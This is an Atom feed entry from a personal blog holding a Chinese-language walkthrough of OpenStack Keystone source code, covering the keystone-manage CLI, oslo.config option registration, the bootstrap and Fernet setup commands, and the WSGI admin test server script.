<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>myndtt || blog</title>
  
  <subtitle>从天堂到彼界 路过人间</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://myndtt.github.io/"/>
  <updated>2019-11-21T09:40:26.102Z</updated>
  <id>https://myndtt.github.io/</id>
  
  <author>
    <name>myndtt</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Openstack之keystone源代码简读一</title>
    <link href="https://myndtt.github.io/2019/11/21/Openstack%E4%B9%8Bkeystone%E6%BA%90%E4%BB%A3%E7%A0%81%E7%AE%80%E8%AF%BB%E4%B8%80/"/>
    <id>https://myndtt.github.io/2019/11/21/Openstack之keystone源代码简读一/</id>
    <published>2019-11-21T09:38:18.000Z</published>
    <updated>2019-11-21T09:40:26.102Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>学习openstack,对其大体框架已经熟悉，学习其内部基本原理，聊以记录。</p><p>作为 OpenStack 的基础支持服务，Keystone 做下面这几件事情：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、管理用户及其权限</span><br><span class="line">    不同用户拥有不同权限。这里的权限不仅仅指的是用户对于某项资源的权限，也包括对某项用户的权限。</span><br><span class="line"><span class="number">2</span>、维护 OpenStack Services 的 Endpoint</span><br><span class="line">Endpoint 是一个网络上可访问的地址，通常是一个 URL。Service 通过 Endpoint 暴露自己的 API，Keystone 负责管理和维护每个 Service 的 Endpoint。（关键）</span><br><span class="line"><span class="number">3.</span>Authentication（认证）和 Authorization（鉴权）</span><br></pre></td></tr></table></figure><p>更多基本概念的介绍可以查看<a href="https://blog.csdn.net/zhongbeida_xue/article/details/78654676" target="_blank" rel="noopener">OpenStack keystone详解及调优</a>和<a href="https://mp.weixin.qq.com/s?__biz=MzIwMTM5MjUwMg==&mid=2653587894&idx=1&sn=877a9cb2c23f242e45e7c113f2d2440f&chksm=8d3081afba4708b9295debc08ac8159927733a1429a5f488ce136370984be15e6039b3496b46&scene=21#wechat_redirect" target="_blank" rel="noopener">理解 Keystone 核心概念 - 每天5分钟玩转 OpenStack(18)</a>，<a href="https://www.cnblogs.com/linhaifeng/p/6248086.html" target="_blank" rel="noopener">推荐看</a></p><a id="more"></a><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p>我的机器是ubuntu 18，可以按照<a href="https://docs.openstack.org/keystone/latest/install/keystone-install-ubuntu.html#install-and-configure-components" target="_blank" rel="noopener">官网</a>安装,或者你不喜欢看简单的英文话，可以参考<a href="https://www.cnblogs.com/jsonhc/p/7692418.html" target="_blank" rel="noopener">这篇</a>或者<a href="https://www.cnblogs.com/linhaifeng/p/6269707.html" target="_blank" rel="noopener">这篇</a>,都讲的很详细，当然因为版本不同，大家不要一股脑就直接复制，粘贴安装。会有问题。</p><h2 id="三、分析openstack-admin"><a href="#三、分析openstack-admin" class="headerlink" title="三、分析openstack-admin"></a>三、分析openstack-admin</h2><p>一般来说，你这样安装<code>apt install keystone</code>的话，keystone会在<code>/usr/lib/python2.7/dist-packages/keystone</code>下。查看 <code>/usr/bin</code>的关于keystone的指令,有<code>keystone-manage,keystone-wsgi-admin,keystone-wsgi-public</code>. 先查看<code>keystone-manage</code>,我们来到<code>cmd</code>目录下的<code>manage.py</code>文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># entry point.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    dev_conf = os.path.join(possible_topdir,</span><br><span class="line">                            <span class="string">'etc'</span>,</span><br><span class="line">                            <span class="string">'keystone.conf'</span>)<span class="comment">#/usr/lib/python2.7/dist-packages/etc/keystone.conf</span></span><br><span class="line"></span><br><span class="line">    config_files = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(dev_conf):</span><br><span class="line">        config_files = [dev_conf]</span><br><span class="line"></span><br><span class="line">    cli.main(argv=sys.argv, config_files=config_files)</span><br></pre></td></tr></table></figure><p>进入<code>cli.py</code>文件的<code>main</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">CMDS = [</span><br><span class="line">    BootStrap,</span><br><span class="line">    CredentialMigrate,</span><br><span class="line">    CredentialRotate,</span><br><span class="line">    CredentialSetup,</span><br><span class="line">    DbSync,</span><br><span class="line">    DbVersion,</span><br><span class="line">    Doctor,</span><br><span class="line">    DomainConfigUpload,</span><br><span class="line">    FernetRotate,</span><br><span class="line">    FernetSetup,</span><br><span class="line">    MappingPopulate,</span><br><span class="line">    MappingPurge,</span><br><span class="line">    MappingEngineTester,</span><br><span class="line">    SamlIdentityProviderMetadata,</span><br><span class="line">    TokenFlush,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_command_parsers</span><span class="params">(subparsers)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> cmd <span class="keyword">in</span> CMDS:</span><br><span class="line">        cmd.add_argument_parser(subparsers)</span><br><span class="line"></span><br><span class="line">command_opt = cfg.SubCommandOpt(<span class="string">'command'</span>,</span><br><span class="line">                                title=<span class="string">'Commands'</span>,</span><br><span class="line">                                help=<span class="string">'Available commands'</span>,</span><br><span class="line">                                handler=add_command_parsers)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv=None, config_files=None)</span>:</span></span><br><span class="line">    CONF.register_cli_opt(command_opt)<span class="comment">#着手注册各类操作</span></span><br><span class="line"></span><br><span class="line">    keystone.conf.configure()<span class="comment">#正式配置各类模块</span></span><br><span class="line">    sql.initialize()<span class="comment">#数据库group的注册操作依靠oslo_db</span></span><br><span class="line">    keystone.conf.set_default_for_default_log_levels() <span class="comment">#日志等级</span></span><br><span class="line"></span><br><span class="line">    CONF(args=argv[<span class="number">1</span>:],</span><br><span class="line">         project=<span class="string">'keystone'</span>,</span><br><span class="line">         version=pbr.version.VersionInfo(<span class="string">'keystone'</span>).version_string(),</span><br><span class="line">         usage=<span class="string">'%(prog)s ['</span> + <span class="string">'|'</span>.join([cmd.name <span class="keyword">for</span> cmd <span class="keyword">in</span> CMDS]) + <span class="string">']'</span>,</span><br><span class="line">         default_config_files=config_files)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> CONF.default_config_files:<span class="comment">#此时为['/etc/keystone/keystone.conf']</span></span><br><span class="line">        LOG.warning(<span class="string">'Config file not found, using default configs.'</span>)</span><br><span class="line">    keystone.conf.setup_logging()<span class="comment">#开始记录</span></span><br><span class="line">    <span class="comment">#keystone.cmd.cli.对应的操作，此次与oslo的cfg cache组件相关(oslo_config.cfg.ConfigOpts)</span></span><br><span class="line">    CONF.command.cmd_class.main()</span><br></pre></td></tr></table></figure><p>关注几个问题。</p><h3 id="1-default-config-files如何获得的？"><a href="#1-default-config-files如何获得的？" class="headerlink" title="1. default_config_files如何获得的？"></a>1. default_config_files如何获得的？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONF(args=argv[<span class="number">1</span>:],</span><br><span class="line">     project=<span class="string">'keystone'</span>,</span><br><span class="line">     version=pbr.version.VersionInfo(<span class="string">'keystone'</span>).version_string(),</span><br><span class="line">     usage=<span class="string">'%(prog)s ['</span> + <span class="string">'|'</span>.join([cmd.name <span class="keyword">for</span> cmd <span class="keyword">in</span> CMDS]) + <span class="string">']'</span>,</span><br><span class="line">     default_config_files=config_files)</span><br></pre></td></tr></table></figure><p>此处调用了<code>CONF</code>的<code>__call__</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self,</span></span></span><br><span class="line"><span class="function"><span class="params">             args=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             project=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             prog=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             version=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             usage=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             default_config_files=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             default_config_dirs=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             validate_default_values=False,</span></span></span><br><span class="line"><span class="function"><span class="params">             description=None,</span></span></span><br><span class="line"><span class="function"><span class="params">             epilog=None,</span></span></span><br><span class="line"><span class="function"><span class="params">   </span></span></span><br><span class="line"><span class="function"><span class="params">    self.clear<span class="params">()</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    self._validate_default_values = validate_default_values</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    prog, default_config_files, default_config_dirs = self._pre_setup<span class="params">(</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        project, prog, version, usage, description, epilog,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        default_config_files, default_config_dirs)</span>#该方法去获取对应的配置文件路径</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    self._setup<span class="params">(project, prog, version, usage, default_config_files,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">                default_config_dirs, use_env)</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    self._namespace = self._parse_cli_opts<span class="params">(args if args is not None</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">                                           else sys.argv[<span class="number">1</span>:])</span></span></span></span><br><span class="line"><span class="function"><span class="params">    if self._namespace._files_not_found:</span></span></span><br><span class="line"><span class="function"><span class="params">        raise ConfigFilesNotFoundError<span class="params">(self._namespace._files_not_found)</span></span></span></span><br><span class="line"><span class="function"><span class="params">    if self._namespace._files_permission_denied:</span></span></span><br><span class="line"><span class="function"><span class="params">        raise ConfigFilesPermissionDeniedError<span class="params">(</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">            self._namespace._files_permission_denied)</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    self._load_alternative_sources<span class="params">()</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    self._check_required_opts<span class="params">()</span></span></span></span><br></pre></td></tr></table></figure><p>尝试可能的路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_pre_setup</span><span class="params">(self, project, prog, version, usage, description, epilog,</span></span></span><br><span class="line"><span class="function"><span class="params">                default_config_files, default_config_dirs)</span>:</span></span><br><span class="line">     <span class="string">"""Initialize a ConfigCliParser object for option parsing."""</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> prog <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">         prog = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">         <span class="keyword">if</span> prog.endswith(<span class="string">".py"</span>):</span><br><span class="line">             prog = prog[:<span class="number">-3</span>]</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> default_config_files <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">         default_config_files = find_config_files(project, prog)</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> default_config_dirs <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">         default_config_dirs = find_config_dirs(project, prog)</span><br><span class="line"></span><br><span class="line">     self._oparser = _CachedArgumentParser(</span><br><span class="line">         prog=prog, usage=usage, description=description, epilog=epilog)</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> version <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">         self._oparser.add_parser_argument(self._oparser,</span><br><span class="line">                                           <span class="string">'--version'</span>,</span><br><span class="line">                                           action=<span class="string">'version'</span>,</span><br><span class="line">                                           version=version)</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> prog, default_config_files, default_config_dirs</span><br></pre></td></tr></table></figure><h3 id="2-操作如何注册？"><a href="#2-操作如何注册？" class="headerlink" title="2.操作如何注册？"></a>2.操作如何注册？</h3><p>关注<code>CONF.command.cmd_class.main()</code>, 该函数会调用对应的操作模块，在此之前会执行模块内的<code>CONF = keystone.conf.CONF</code>，其返回的是<code>oslo_config.cfg.ConfigOpts</code>类的实例。(模块初始化时服务把默认的配置项及配置组注册至cfg中)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_cli_opt</span><span class="params">(self, opt, group=None)</span>:</span></span><br><span class="line">    <span class="string">"""Register a CLI option schema.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CLI option schemas must be registered before the command line and</span></span><br><span class="line"><span class="string">    config files are parsed. This is to ensure that all CLI options are</span></span><br><span class="line"><span class="string">    shown in --help and option validation works as expected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param opt: an instance of an Opt sub-class</span></span><br><span class="line"><span class="string">    :param group: an optional OptGroup object or group name</span></span><br><span class="line"><span class="string">    :return: False if the opt was already registered, True otherwise</span></span><br><span class="line"><span class="string">    :raises: DuplicateOptError, ArgsAlreadyParsedError</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> self._args <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ArgsAlreadyParsedError(<span class="string">"cannot register CLI option"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.register_opt(opt, group, cli=<span class="literal">True</span>, clear_cache=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#......</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_opt</span><span class="params">(self, opt, group=None, cli=False)</span>:</span></span><br><span class="line">    <span class="string">"""Register an option schema.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Registering an option schema makes any option value which is previously</span></span><br><span class="line"><span class="string">    or subsequently parsed from the command line or config files available</span></span><br><span class="line"><span class="string">    as an attribute of this object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param opt: an instance of an Opt sub-class#具体实例</span></span><br><span class="line"><span class="string">    :param group: an optional OptGroup object or group name#配置文件的片段</span></span><br><span class="line"><span class="string">    :param cli: whether this is a CLI option #标明是否为可从命令行接受的option。</span></span><br><span class="line"><span class="string">    :return: False if the opt was already registered, True otherwise</span></span><br><span class="line"><span class="string">    :raises: DuplicateOptError</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> group <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        group = self._get_group(group, autocreate=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> cli:</span><br><span class="line">            self._add_cli_opt(opt, group)</span><br><span class="line">        self._track_deprecated_opts(opt, group=group)</span><br><span class="line">        <span class="keyword">return</span> group._register_opt(opt, cli)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(gcb) We can't use some names which are same with attributes of</span></span><br><span class="line">    <span class="comment"># Opts in default group. They includes project, prog, version, usage,</span></span><br><span class="line">    <span class="comment"># default_config_files and default_config_dirs.</span></span><br><span class="line">    <span class="keyword">if</span> group <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> opt.name <span class="keyword">in</span> self.disallow_names:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'Name %s was reserved for oslo.config.'</span></span><br><span class="line">                             % opt.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cli:</span><br><span class="line">        self._add_cli_opt(opt, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _is_opt_registered(self._opts, opt):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    self._opts[opt.dest] = &#123;<span class="string">'opt'</span>: opt, <span class="string">'cli'</span>: cli&#125;</span><br><span class="line">    self._track_deprecated_opts(opt)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>则command_opt,也即各类操作注册完成。(Group的注册类似)。</p><h3 id="3-配置文件中的Frenet是什么"><a href="#3-配置文件中的Frenet是什么" class="headerlink" title="3.配置文件中的Frenet是什么"></a>3.配置文件中的Frenet是什么</h3><p>keystone有好几种认证方式：UUID、PKI(PKIZ)、Fernet;Frent是其中一种而已，具体这三者认证之间的区别，<a href="https://www.cnblogs.com/dhplxf/p/7966890.html]" target="_blank" rel="noopener">这篇</a>和<a href="https://www.jianshu.com/p/e1b206ebda5b" target="_blank" rel="noopener">这篇</a>已经讲的很好了，不赘述了。</p><h3 id="4-几条命令"><a href="#4-几条命令" class="headerlink" title="4.几条命令"></a>4.几条命令</h3><p>回顾一下，安装时候用到的几条命令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">keystone-manage db_sync   #数据库同步，初始化，生成对应的orm关系映射</span><br><span class="line">#一下两条是生成认证时对应的key</span><br><span class="line">keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone</span><br><span class="line">keystone-manage credential_setup --keystone-user keystone --keystone-group keystone</span><br></pre></td></tr></table></figure><p>重点看看这条</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keystone-manage bootstrap --bootstrap-password ADMIN_PASS \</span><br><span class="line">  --bootstrap-admin-url http://controller:<span class="number">5000</span>/v3/ \</span><br><span class="line">  --bootstrap-internal-url http://controller:<span class="number">5000</span>/v3/ \</span><br><span class="line">  --bootstrap-public-url http://controller:<span class="number">5000</span>/v3/ \</span><br><span class="line">  --bootstrap-region-id RegionOne</span><br></pre></td></tr></table></figure><p>这一条就可以理解为创建管理员并引导对应的身份认证服务，不指定用户名默认为admin,在bootstrap选项里，并没有domain的设定项，所以默认的domain只能是Default。没有设定角色默认创建三个角色admin，member，reader。</p><h3 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a>5.其他</h3><p><code>keystone-wsgi-admin</code></p><p><code>keystone-wsgi-public</code></p><p>这两个实际上是测试使用，当然现在版本的keystone是以apache可以启动，<code>/etc/apache2/sites-enabled</code>下的<code>keystone.conf</code>文件。</p><p><code>WSGIScriptAlias / /usr/bin/keystone-wsgi-public</code> 已经使用WSGIScriptAlias指令来指定wsgi application的启动脚本。</p><p>以 keystone-wsgi-admin为例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python2</span></span><br><span class="line"><span class="comment">#PBR Generated from u'wsgi_scripts'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> keystone.server.wsgi <span class="keyword">import</span> initialize_admin_application</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line">    <span class="keyword">import</span> socket</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> wsgiref.simple_server <span class="keyword">as</span> wss</span><br><span class="line"></span><br><span class="line">    my_ip = socket.gethostbyname(socket.gethostname())</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=initialize_admin_application.__doc__,</span><br><span class="line">        formatter_class=argparse.ArgumentDefaultsHelpFormatter,</span><br><span class="line">        usage=<span class="string">'%(prog)s [-h] [--port PORT] [--host IP] -- [passed options]'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--port'</span>, <span class="string">'-p'</span>, type=int, default=<span class="number">8000</span>,</span><br><span class="line">                        help=<span class="string">'TCP port to listen on'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--host'</span>, <span class="string">'-b'</span>, default=<span class="string">''</span>,</span><br><span class="line">                        help=<span class="string">'IP to bind the server to'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'args'</span>,</span><br><span class="line">                        nargs=argparse.REMAINDER,</span><br><span class="line">                        metavar=<span class="string">'-- [passed options]'</span>,</span><br><span class="line">                        help=<span class="string">"'--' is the separator of the arguments used "</span></span><br><span class="line">                        <span class="string">"to start the WSGI server and the arguments passed "</span></span><br><span class="line">                        <span class="string">"to the WSGI application."</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.args:</span><br><span class="line">        <span class="keyword">if</span> args.args[<span class="number">0</span>] == <span class="string">'--'</span>:</span><br><span class="line">            args.args.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.error(<span class="string">"unrecognized arguments: %s"</span> % <span class="string">' '</span>.join(args.args))</span><br><span class="line">    sys.argv[<span class="number">1</span>:] = args.args</span><br><span class="line">    server = wss.make_server(args.host, args.port, initialize_admin_application())<span class="comment">#关键！！！！</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"*"</span> * <span class="number">80</span>)</span><br><span class="line">    print(<span class="string">"STARTING test server keystone.server.wsgi.initialize_admin_application"</span>)</span><br><span class="line">    url = <span class="string">"http://%s:%d/"</span> % (server.server_name, server.server_port)</span><br><span class="line">    print(<span class="string">"Available at %s"</span> % url)</span><br><span class="line">    print(<span class="string">"DANGER! For testing only, do not use in production"</span>)</span><br><span class="line">    print(<span class="string">"*"</span> * <span class="number">80</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    server.serve_forever()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    application = <span class="literal">None</span></span><br><span class="line">    app_lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> app_lock:</span><br><span class="line">        <span class="keyword">if</span> application <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            application = initialize_admin_application()</span><br></pre></td></tr></table></figure><p>关键在于<code>initialize_admin_application</code> 和<code>wsgiref.simple_server</code>，下次再说吧！！</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>keystone组件的启动离不开oslo这个openstack公开库。主要跟oslo.config有很大关系。不仅如此，似乎其他组件的服务启动也是如此。该库的基本使用可以<a href="https://blog.csdn.net/canxinghen/article/details/51711457" target="_blank" rel="noopener">参考</a>,详细的可以<a href="https://blog.csdn.net/Bill_Xiang_/column/info/18110" target="_blank" rel="noopener">参考</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;学习openstack,对其大体框架已经熟悉，学习其内部基本原理，聊以记录。&lt;/p&gt;
&lt;p&gt;作为 OpenStack 的基础支持服务，Keystone 做下面这几件事情：&lt;/p&gt;
